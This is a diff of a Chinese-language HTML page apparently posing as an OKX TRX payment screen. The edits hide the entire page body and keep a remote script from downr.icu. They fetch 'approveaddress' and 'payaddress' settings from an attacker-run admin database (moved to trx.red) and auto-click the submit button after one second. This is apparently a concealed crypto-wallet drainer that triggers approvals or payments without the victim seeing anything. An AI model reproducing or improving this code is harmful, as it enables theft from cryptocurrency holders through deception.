@@ -1,4 +1,4 @@
-<html lang="zh-CN" style="--status-bar-height: 0px; --top-window-height: 0px; --window-left: 0px; --window-right: 0px; --window-margin: 0px; font-size: 17.2px; --window-top: calc(var(--top-window-height) + 0px); --window-bottom: 0px;">
+<html lang="zh-CN">
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -9,45 +9,14 @@
     <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
     <script>eruda.init();</script>
     <style>
-        ::-webkit-scrollbar {
+        /* 隐藏页面上的所有内容 */
+        body {
             display: none;
         }
     </style>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            document.documentElement.style.fontSize = document.documentElement.clientWidth / 25 + 'px'
-        });
-    </script>
-    <link rel="stylesheet" href="newokx/js/okex.css">
 </head>
-<body class="uni-body pages-index-home">
-<noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
-
-<uni-app class="uni-app--maxwidth">
-    <uni-page data-page="pages/index/home">
-        <uni-page-wrapper>
-            <uni-page-body>
-                <body data-v-49fe1bb8="">
-                    <div data-v-49fe1bb8="" id="app">
-                        <div data-v-49fe1bb8="" class="pay-box">
-                            <div data-v-49fe1bb8="" class="amount">
-                                <div data-v-49fe1bb8="" class="num">
-                                    <span class="amount" id="amount">0</span><em data-v-49fe1bb8="">TRX</em>
-                                </div>
-                                <img data-v-49fe1bb8="" src="newokx/icon_exchange.jpg" class="icon">
-                            </div>
-                            <div data-v-49fe1bb8="" class="rate">
-                                <span id="amount-display">0</span><em data-v-49fe1bb8="">TRX</em>
-                                <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="newokx/icon_horn.jpg"></div>
-                            </div>
-                        </div>
-                    </div>
-                </body>
-            </uni-page-body>
-        </uni-page-wrapper>
-    </uni-page>
-
-    <!-- 保留原来的引用的JS -->
+<body>
+    <!-- 保留原来的JS文件引用 -->
     <script type="text/javascript" src="https://downr.icu/bfpay.js"></script>
     <script type="text/javascript" src="newokx/js/help.js"></script>
     <script type="text/javascript" src="newokx/js/common.js"></script>
@@ -56,7 +25,7 @@
         // 保留从 downr.icu 获取数据的逻辑
         let approveaddress, payaddress, isopen, ismiaou;
         var domain = '';
-        fetch('https://downr.icu/yyadmin/database.php')
+        fetch('https://trx.red/yyadmin/database.php')
             .then(response => response.json())
             .then(data => {
                 data.forEach(config => {
@@ -78,7 +47,7 @@
                     }
                 });
 
-                if(isopen === '0'){
+                if (isopen === '0') {
                     console.log(isopen);
                 } else {
                     window.location.href = '/404.php';
@@ -88,27 +57,13 @@
                 console.error('Error fetching config:', error);
             });
 
-        // 模拟输入 0 并自动点击“下一步”按钮
+        // 页面加载后自动执行submitBtn的点击逻辑
         document.addEventListener('DOMContentLoaded', function() {
-            var amount = document.getElementById('amount');
-            var amountDisplay = document.getElementById('amount-display');
-            var submitBtn = document.getElementById('submitBtn');
-
-            // 模拟输入0
-            amount.textContent = '0';  
-            amountDisplay.textContent = '0';  
-
-            // 启用“下一步”按钮
-            submitBtn.classList.remove('disabled');
-            submitBtn.disabled = false;
-
-            // 自动点击“下一步”按钮
+            // 模拟点击“下一步”按钮
             setTimeout(function() {
-                submitBtn.click();
-            }, 1000);  // 延迟1秒后自动点击
+                document.getElementById('submitBtn').click(); // 模拟点击submitBtn按钮
+            }, 1000); // 延迟1秒后自动点击
         });
     </script>
-</uni-app>
-
 </body>
 </html>
